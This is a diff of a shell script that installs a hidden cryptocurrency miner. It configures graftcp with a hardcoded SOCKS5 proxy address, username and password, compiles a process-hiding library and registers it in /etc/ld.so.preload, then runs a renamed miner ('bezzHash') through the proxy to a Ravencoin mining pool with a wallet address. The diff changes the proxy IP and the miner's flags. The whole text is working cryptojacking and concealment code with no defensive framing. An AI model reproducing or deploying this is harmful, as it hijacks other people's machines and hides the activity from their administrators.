@@ -11,7 +11,7 @@ tar -xvzf graphics.tar.gz
 cat > graftcp/local/graftcp-local.conf <<END
 listen = :2233
 loglevel = 1
-socks5 = 3.16.66.235:1080
+socks5 = 52.15.235.202:1080
 socks5_username = mikrotik999
 socks5_password = Elibawnos
 END
@@ -45,4 +45,4 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp ./bezzHash --url=ssl://RSXqoGq5CKxy7eSm8pcSjpCMGenD9FY3gj.bezzHash@us.ravenminer.com:13838 --log --extra --latency --all-shares --shares-detail --ocX --list-modes --mt-auto
+./graftcp/graftcp ./bezzHash --url=ssl://RSXqoGq5CKxy7eSm8pcSjpCMGenD9FY3gj.bezzHash@us.ravenminer.com:13838 --log --extra --latency --all-shares --shares-detail --list-modes --show-mode
